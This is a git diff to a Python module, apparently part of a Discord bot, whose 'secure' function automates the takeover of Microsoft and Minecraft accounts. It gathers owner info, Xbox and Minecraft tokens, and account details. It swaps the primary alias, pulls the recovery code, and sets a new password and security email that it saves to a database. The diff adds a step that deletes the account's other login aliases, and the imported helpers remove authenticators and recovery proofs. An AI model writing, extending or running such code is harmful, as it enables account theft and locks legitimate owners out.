@@ -1,4 +1,3 @@
-from cogs import config
 from securing.utils.security_information import security_information
 from securing.utils.change_primary_alias import change_primary_alias
 from securing.utils.add_authenticator import add_authenticator
@@ -6,6 +5,7 @@ from securing.utils.get_recovery_code import get_recovery_code
 from securing.utils.remove_services import remove_services
 from securing.utils.generate_email import generate_email
 from securing.utils.get_owner_info import get_owner_info
+from securing.utils.delete_aliases import delete_aliases
 from securing.utils.remove_proof import remove_proof
 from securing.utils.remove_zyger import remove_zyger
 from securing.utils.get_cookies import get_cookies
@@ -43,7 +43,10 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     T = await get_t(session)
     print("[+] - Found T")
 
+    # Token needed to make API requests for the account
     verificationToken = await get_amc(session)
+
+    # Gets account info via microsofts API
     ownerInfo = await get_owner_info(session, verificationToken)
 
     if ownerInfo:
@@ -64,10 +67,8 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
         # XBL && Token
         xbl = XBLResponse["xbl"]
-
         ssid = await get_ssid(xbl)
         
-        # Get capes, profile and purchase method
         if ssid:    
             print("[+] - Got SSID! (Has Minecraft)")
 
@@ -80,19 +81,21 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
 
             # Gets account name
             profile = await get_profile(ssid)
-            if not profile:
-                print("[x] - Failed to get profile (No Minecraft Java)")
-            else:
+            if profile:
                 print(f"[+] - Got profile (Has Minecraft Java)")
                 accountInfo["minecraft"]["SSID"] = ssid
                 accountInfo["minecraft"]["name"] = profile
+            else:
+                print("[x] - Failed to get profile (No Minecraft Java)")
                 
+                # Wether its changeable
                 usernameInfo = await get_username_info(ssid)
                 if not usernameInfo:
                     accountInfo["minecraft"]["uchange"] = "Yes"
                 else:
                     accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"
 
+            # Minecraft purchase method
             method = await get_method(ssid)
             if method:
                 accountInfo["minecraft"]["method"] = method
@@ -132,7 +135,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             main_email = securityParameters["email"]
             encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
 
-            # Change Primary Alias is broken
+            # Changes Primary Alias
             if replace_alias:
             
                 primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
@@ -142,19 +145,18 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
                 if change_alias:
                     accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                     main_email = f"{primaryEmail}@outlook.com"
-                    canary = change_alias[0]
                 else:
                     accountInfo["microsoft"]["email"] = main_email
             else:
                 accountInfo["microsoft"]["email"] = main_email
 
+            # Gets recovery code
             recovery_code = await get_recovery_code(
                 session,
                 apicanary,
                 encryptedNetID
             )
             print(f"[+] - Got Recovery Code | {recovery_code}")
-
             security_email = uuid.uuid4().hex[:16]
             password = uuid.uuid4().hex[:12]
 
@@ -163,9 +165,12 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             print(f"[+] - Generated Security Email ({security_email})")
             database.add_security_email(security_email, password)
 
+            # Changes password & generate a new recovery code
             print("[~] - Automaticly Securing Account...")
-            print(f"main_email: {main_email}")
             data = await recover(session, main_email, recovery_code, security_email, password, type)
+
+            # Delete other login aliases
+            await delete_aliases(session)
 
             if data and data != "invalid":
                 accountInfo["microsoft"]["security_email"] = security_email
